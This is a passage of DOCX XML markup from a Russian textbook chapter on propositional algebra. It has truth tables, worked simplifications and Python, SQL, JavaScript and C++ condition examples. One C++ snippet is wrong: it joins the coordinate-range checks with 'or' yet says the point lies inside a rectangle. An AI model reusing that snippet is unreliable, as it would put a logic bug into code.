        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Использование скобок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хотя приоритет операций определён, для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>улучшения читаемости</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> рекомендуется использовать скобки, особенно в сложных выражениях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хорошая практика:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Вместо:   A ∨ B ∧ C</w:t>
        <w:br/>
        <w:t>Лучше:    A ∨ (B ∧ C)    [явно показываем порядок]</w:t>
        <w:br/>
        <w:br/>
        <w:t>Вместо:   A → B ∨ C ∧ D</w:t>
        <w:br/>
        <w:t>Лучше:    A → (B ∨ (C ∧ D))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В программировании</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> также следует использовать скобки для ясности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Непонятно:</w:t>
        <w:br/>
        <w:t>result = a or b and c</w:t>
        <w:br/>
        <w:br/>
        <w:t># Понятно:</w:t>
        <w:br/>
        <w:t>result = a or (b and c)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практические примеры применения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Анализ условия в программировании</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Пользователь может войти в систему, если у него есть логин И пароль, ИЛИ если у него есть токен доступа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формализация:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A = "есть логин"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B = "есть пароль"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C = "есть токен"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результат = (A ∧ B) ∨ C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A (логин) | B (пароль) | C (токен) | A ∧ B | (A ∧ B) ∨ C | Доступ  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----------|-----------|-----------|-------|-------------|---------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0         | 0         | 0         | 0     | 0           | Нет     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0         | 0         | 1         | 0     | 1           | Да      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0         | 1         | 0         | 0     | 0           | Нет     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0         | 1         | 1         | 0     | 1           | Да      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1         | 0         | 0         | 0     | 0           | Нет     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1         | 0         | 1         | 0     | 1           | Да      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1         | 1         | 0         | 1     | 1           | Да      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1         | 1         | 1         | 1     | 1           | Да      |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Доступ разрешён в 4 случаях из 8.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код на Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def can_login(has_login, has_password, has_token):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return (has_login and has_password) or has_token</w:t>
        <w:br/>
        <w:br/>
        <w:t># Тест:</w:t>
        <w:br/>
        <w:t>print(can_login(True, True, False))   # True — есть логин и пароль</w:t>
        <w:br/>
        <w:t>print(can_login(False, False, True))  # True — есть токен</w:t>
        <w:br/>
        <w:t>print(can_login(True, False, False))  # False — только логин недостаточно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Упрощение логического выражения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Упростить выражение: F = A ∧ B ∨ A ∧ ¬B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>F = A ∧ B ∨ A ∧ ¬B</w:t>
        <w:br/>
        <w:t xml:space="preserve">  = A ∧ (B ∨ ¬B)       [вынесение общего множителя A]</w:t>
        <w:br/>
        <w:t xml:space="preserve">  = A ∧ 1              [закон исключённого третьего: B ∨ ¬B = 1]</w:t>
        <w:br/>
        <w:t xml:space="preserve">  = A                  [нейтральный элемент: A ∧ 1 = A]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> F = A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка через таблицу истинности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ∧ B | ¬B | A ∧ ¬B | (A ∧ B) ∨ (A ∧ ¬B) | A (упрощённое) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|----|--------|-------------------|----------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 0     | 1  | 0      | 0                 | 0              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0     | 0  | 0      | 0                 | 0              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     | 1  | 1      | 1                 | 1              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     | 0  | 0      | 1                 | 1              |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Столбцы "исходное выражение" и "упрощённое" совпадают → упрощение верно!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Применение законов де Моргана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Упростить: F = ¬((A ∨ B) ∧ C)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>F = ¬((A ∨ B) ∧ C)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  = ¬(A ∨ B) ∨ ¬C       [закон де Моргана для ∧]</w:t>
        <w:br/>
        <w:t xml:space="preserve">  = (¬A ∧ ¬B) ∨ ¬C      [закон де Моргана для ∨]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> F = (¬A ∧ ¬B) ∨ ¬C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> исходное выражение "(A или B) и C" после отрицания превращается в "(не-A и не-B) или не-C".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: SQL-запрос с логическими операциями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти сотрудников, которые:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>работают в отделе продаж (A) И имеют опыт более 5 лет (B)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ИЛИ работают в IT-отделе (C)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическое выражение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (A ∧ B) ∨ C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQL-запрос:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT * FROM employees</w:t>
        <w:br/>
        <w:t>WHERE (department = 'Sales' AND experience &gt; 5)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   OR (department = 'IT');</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Логическая схема дверного замка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Дверь открывается, если:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вставлен ключ (A) И повёрнут вправо (B)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ИЛИ введён правильный код (C)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>НО НЕ если сработала сигнализация (D)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическое выражение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ((A ∧ B) ∨ C) ∧ ¬D</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Упрощение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>F = ((A ∧ B) ∨ C) ∧ ¬D</w:t>
        <w:br/>
        <w:t xml:space="preserve">  = (A ∧ B ∧ ¬D) ∨ (C ∧ ¬D)    [дистрибутивность]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесная формулировка:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> дверь открывается, если (есть ключ И он повёрнут И нет сигнализации) ИЛИ (введён код И нет сигнализации).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Решение логической задачи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Трое друзей — Алекс (A), Борис (Б) и Виктор (В) — обсуждают, кто пойдёт в кино. Известно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если идёт Алекс, то идёт и Борис: A → Б</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Виктор идёт тогда и только тогда, когда идёт Алекс: В ↔ A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Борис не идёт: ¬Б</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Кто пойдёт в кино?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Из условия 3: Б = 0 (Борис не идёт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Из условия 1: A → Б  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Подставим Б = 0:  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A → 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Импликация A → 0 истинна только при A = 0 (если A = 1, то импликация ложна).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Следовательно, A = 0 (Алекс не идёт).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Из условия 2: В ↔ A  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Подставим A = 0:  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>В ↔ 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Эквивалентность В ↔ 0 истинна только при В = 0.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Следовательно, В = 0 (Виктор не идёт).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Никто не пойдёт в кино (A = 0, Б = 0, В = 0).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A → Б = 0 → 0 = 1 ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>В ↔ A = 0 ↔ 0 = 1 ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>¬Б = ¬0 = 1 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Все условия выполнены!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Применение в программировании и технике</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Условные операторы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Во всех языках программирования логические операции используются в условных операторах:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if (temperature &gt; 30) and (humidity &lt; 40):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Жарко и сухо")</w:t>
        <w:br/>
        <w:t>elif (temperature &lt; 0) or (is_snowing):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Холодно или снег")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Нормальная погода")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JavaScript:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if (!user.isBlocked &amp;&amp; (user.isPremium || user.credits &gt; 0)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    allowAccess();</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C++:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>if ((x &gt; 0 &amp;&amp; x &lt; 100) || (y &gt; 0 &amp;&amp; y &lt; 100)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Точка внутри прямоугольника</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Битовые операции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Логические операции напрямую применяются для манипуляции битами:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Битовые операции</w:t>
        <w:br/>
        <w:t>a = 0b1010  # 10 в двоичной</w:t>
        <w:br/>
        <w:t>b = 0b1100  # 12 в двоичной</w:t>
        <w:br/>
        <w:br/>
        <w:t>and_result = a &amp; b   # 0b1000 = 8 (побитовое И)</w:t>
        <w:br/>
        <w:t>or_result = a | b    # 0b1110 = 14 (побитовое ИЛИ)</w:t>
        <w:br/>
        <w:t>xor_result = a ^ b   # 0b0110 = 6 (побитовое XOR)</w:t>
        <w:br/>
        <w:t>not_result = ~a      # инверсия всех битов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> установка/сброс флагов, маски, кодирование, шифрование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Логические элементы в схемах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Все цифровые схемы строятся на базе логических элементов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные элементы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Элемент НЕ (инвертор)** — один вход, один выход</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Элемент И (AND)** — два или более входа, один выход</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Элемент ИЛИ (OR)** — два или более входа, один выход</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Элемент И-НЕ (NAND)** — наиболее универсальный элемент</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Элемент ИЛИ-НЕ (NOR)** — также универсальный элемент</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессоры состоят из миллиардов транзисторов, реализующих логические элементы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Арифметико-логическое устройство (АЛУ) выполняет операции с помощью логических схем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Схемы памяти (триггеры, регистры) построены на логических элементах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Поисковые запросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Поисковые системы и базы данных используют логические операции:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google/Yandex:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>"машинное обучение" AND (Python OR R) NOT реклама</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT * FROM products</w:t>
        <w:br/>
        <w:t>WHERE (category = 'Electronics' AND price &lt; 1000)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   OR (category = 'Books' AND rating &gt; 4.5);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгебра высказываний тесно связана с другими разделами информатики:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.1 (Арифметика в двоичной системе)** — логические операции — это основа двоичной арифметики. Сумматоры и вычитатели строятся на логических элементах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.11 (Системы счисления)** — битовые логические операции применяются для работы с числами в различных системах счисления.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1 (Архитектура ЭВМ)** — процессор содержит арифметико-логическое устройство (АЛУ), которое выполняет логические операции над данными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 5 (Основы алгоритмизации)** — алгоритмы используют логические условия для ветвления и циклов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 6 (Языки программирования)** — все языки программирования поддерживают логические операции и выражения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 7 (Базы данных)** — SQL-запросы содержат логические условия (WHERE с AND, OR, NOT).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Высказывание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — повествовательное предложение, которое может быть истинным или ложным.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгебра высказываний (булева алгебра)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — раздел математической логики, изучающий операции над высказываниями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
